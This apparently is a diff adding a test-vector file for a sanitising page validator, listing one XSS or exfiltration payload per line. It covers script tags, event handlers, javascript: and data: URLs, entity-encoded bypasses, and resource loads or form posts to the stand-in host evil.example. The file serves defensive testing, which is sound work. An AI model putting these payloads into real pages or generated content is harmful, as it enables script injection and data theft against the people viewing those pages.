@@ -1,0 +1,95 @@
+# Base XSS / exfiltration vectors for the page validator (one per line; # = comment).
+# Written for loopwatch's threat model: model-written page bodies that must render inert.
+# Every line is an ACTIVE payload: executes script, loads a remote resource, navigates,
+# or submits data. mutate.py derives case/encoding/whitespace/quoting variants.
+<script>alert(1)</script>
+<script src=//evil.example/x.js></script>
+<script>/**/alert(1)</script>
+<SCRIPT SRC=//evil.example/x.js></SCRIPT>
+<img src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img/src=x/onerror=alert(1)>
+<img src=x onerror=alert`1`>
+<img src=//evil.example/p.png>
+<img srcset="//evil.example/p.png 1x">
+<svg onload=alert(1)>
+<svg><script>alert(1)</script></svg>
+<svg><a xlink:href="javascript:alert(1)"><text x="0" y="20">x</text></a></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<div onmouseover=alert(1)>x</div>
+<p onclick=alert(1)>x</p>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)></textarea>
+<video><source onerror=alert(1)></video>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>x</marquee>
+<a href="javascript:alert(1)">x</a>
+<a href="JaVaScRiPt:alert(1)">x</a>
+<a href=" javascript:alert(1)">x</a>
+<a href="vbscript:msgbox(1)">x</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<a href="https://evil.example/">x</a>
+<a href="//evil.example/">x</a>
+<a href="\\evil.example\x">x</a>
+<a ping="https://evil.example/p" href="#x">x</a>
+<iframe src="https://evil.example/"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="javascript:alert(1)"></iframe>
+<frameset><frame src="javascript:alert(1)"></frameset>
+<object data="javascript:alert(1)"></object>
+<object data="//evil.example/x.swf"></object>
+<embed src="javascript:alert(1)">
+<embed src="//evil.example/x.swf">
+<form action="https://evil.example/"><input name=q></form>
+<form><button formaction="javascript:alert(1)">x</button></form>
+<isindex action=javascript:alert(1) type=image>
+<base href="https://evil.example/">
+<link rel=stylesheet href="//evil.example/x.css">
+<link rel=import href="//evil.example/x.html">
+<meta http-equiv="refresh" content="0;url=https://evil.example/">
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<style>@import "//evil.example/x.css";</style>
+<style>body{background:url(//evil.example/p.png)}</style>
+<div style="background:url(//evil.example/p.png)">x</div>
+<div style="background-image:url('javascript:alert(1)')">x</div>
+<div style="width:expression(alert(1))">x</div>
+<table background="//evil.example/p.png"><tr><td>x</td></tr></table>
+<video poster="//evil.example/p.png"></video>
+<blockquote cite="//evil.example/"></blockquote>
+<portal src="https://evil.example/"></portal>
+<applet code="x" codebase="//evil.example/"></applet>
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<a href="data:image/svg+xml,<svg onload=alert(1)>">x</a>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+<xmp><p title="</xmp><img src=x onerror=alert(1)>"></xmp>
+<title><img src=x onerror=alert(1)></title>
+<!--><img src=x onerror=alert(1)>-->
+<![CDATA[><img src=x onerror=alert(1)>]]>
+<? foo="><script>alert(1)</script>">
+<img alt=">" src=x onerror=alert(1)>
+<img alt='>' src=x onerror=alert(1)>
+<a href="#" title="x"onclick=alert(1)>x</a>
+<a href="java&#x09;script:alert(1)">x</a>
+<a href="java&#10;script:alert(1)">x</a>
+<a href="java&Tab;script:alert(1)">x</a>
+<a href="javascript&colon;alert(1)">x</a>
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>
+<a href="&#x6A;avascript:alert(1)">x</a>
+<a href="&#0000106avascript:alert(1)">x</a>
+<a href="&#x0000006A;avascript:alert(1)">x</a>
+<img src=x:alert(1) onerror=eval(src)>
+<keygen autofocus onfocus=alert(1)>
+<button popovertarget=p>x</button><div popover id=p onbeforetoggle=alert(1)>x</div>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<svg><style><img src=x onerror=alert(1)></style></svg>
+<template><script>alert(1)</script></template>
+<object type="text/html" data="//evil.example/"></object>
+<a href="https:&#47;&#47;evil.example/">x</a>
+<a href="//evil.example&#47;x">x</a>
+<img src="&#47;&#47;evil.example/p.png">
+<div style="background:u&#114;l(//evil.example/p.png)">x</div>
+<div style="background:\75rl(//evil.example/p.png)">x</div>
